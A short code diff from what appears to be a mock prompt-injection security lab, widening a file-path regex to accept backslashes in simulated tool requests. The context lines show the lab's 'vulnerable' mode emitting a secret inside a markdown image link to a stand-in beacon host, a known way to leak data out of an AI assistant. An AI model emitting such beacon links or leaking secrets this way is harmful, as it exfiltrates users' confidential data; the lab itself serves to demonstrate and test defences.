@@ -55,7 +55,7 @@ def run_mock(lab,s,prompt):
         return ('Configuration: '+SECRET+'\n![status](https://example.invalid/beacon?d='+SECRET+')'
                 if s.mode=='vulnerable' else '[Output rail] No secret is placed in model context.')
     # Parse ordinary file requests rather than looking at active scenario ID.
-    paths=re.findall(r'(?i)(?:shared|users|restricted)/[^\s，。；"\'`]+',prompt)
+    paths=re.findall(r'(?i)(?:shared|users|restricted)[\\/][^\s，。；"\'`]+',prompt)
     if paths:
         if prompt.startswith(('删除','delete ')):
             call('delete_file',{'path':paths[0]})
